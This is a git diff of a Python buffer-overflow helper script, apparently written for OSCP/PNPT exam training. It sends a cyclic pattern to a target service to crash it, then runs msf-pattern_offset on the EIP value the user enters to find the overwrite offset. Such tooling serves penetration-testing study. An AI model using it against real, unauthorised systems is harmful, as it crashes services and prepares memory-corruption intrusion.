@@ -4,11 +4,9 @@
 #Olivier Laflamme - https://boschko.ca/braindead-buffer-overflow-guide-to-pass-the-oscp-blindfolded/
 #Heath Adams (The Cyber Mentor)'s PNPT Training - https://github.com/hmaverickadams
 
-#May need to replace msf-pattern_create with complete path
-#Target appears to crash in the middle of sending the payload, throwing a socket.OSError exception. Same exception which is thrown when no connection is established.
+#May need to replace msf-pattern_create/msf-pattern_offset with complete path
 
 import argparse, sys, socket, subprocess
-from time import sleep
 
 args = argparse.ArgumentParser(usage='%(prog)s -i <IP> -p <PORT> --prefix <Optional> -b <Optional>')
 args.add_argument("-i", "--ip", required=True, help="IP Address")
@@ -42,4 +40,7 @@ with socket.socket(socket.AF_INET, socket. SOCK_STREAM) as s:
 	s.recv(1024) 
 	print("Sending patterned payload.")
 	s.send(payload)
-	sys.exit()
+
+eip_value = input("Value of EIP: ")
+exact_offset = subprocess.run(['msf-pattern_offset', '-l', crash_bytes, '-q', eip_value], stdout=subprocess.PIPE).stdout.decode()
+print(exact_offset)
